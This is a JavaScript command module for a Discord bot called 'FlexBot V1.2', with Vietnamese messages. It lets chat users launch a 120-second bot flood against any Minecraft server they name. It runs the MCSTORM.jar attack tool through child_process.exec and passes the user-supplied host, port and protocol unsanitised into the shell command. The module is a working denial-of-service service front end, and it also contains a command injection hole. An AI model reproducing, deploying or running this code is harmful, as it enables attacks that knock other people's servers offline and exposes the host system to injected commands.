const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;
const roleName = message.member.roles.cache.find(r => r.name === "[ᴀᴛᴛᴀᴄᴋ-ʙᴀsɪᴄ]")

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;attack 1.1.1.1 25565 47`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng trí ghi Cổng`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng trí ghi phiên bản BOT`")
	message.channel.send(embed1);
	return;
	}

if (roleName) {
    const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Sống đẹp lên bạn')
	.setDescription("`Yêu cầu đồng trí nâng cấp lên Premium`")
	message.channel.send(embed1);
	return;
  }
if (message.channel.id != room) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Uả lệnh j lạ dzi')
	message.channel.send(embed1);
	return;
  }
var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar ${host}:${port} ${protocol} invalidnames 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **FlexBot V1.2** 🔥')
	.setTimestamp()
	.setDescription("**► Cuộc tấn công đã dừng lại 💥**")
	.setFooter('© Nhà phát triển MiniFlex#6903.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://c.tenor.com/4HRZBZapfssAAAAC/solo-leveling-sung-jin-woo.gif", "https://c.tenor.com/QVP_ZaioFPMAAAAC/solo-leveling-smile.gif", "https://c.tenor.com/0N_Otx22J7UAAAAd/sung-jin-woo-jin-woo.gif" , "https://c.tenor.com/9DKiAQSTDucAAAAd/jin-woo-sung-jin-woo.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **FlexBot V1.2** 🔥')
	.setTimestamp()
	.setDescription("**Người Dùng**: `" + message.author.username + "` \n **Máy Chủ**: `" + host + "` \n **Cổng**: `" + port + "` \n **Phiên Bản**: `" + protocol + "`\n \n **Phương pháp**: `InvalidNames 💥` \n **Số lượng Bot**: `25.000 🚀` \n **Thời gian**: `120 giây 🕒`")
	.setFooter('© Nhà phát triển MiniFlex#6903.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['invalidnames'],
  permLevel: 0
}

exports.help = {
  name: 'invalidnames',
  description: 'Özel',
  usage: 'invalidnames'
}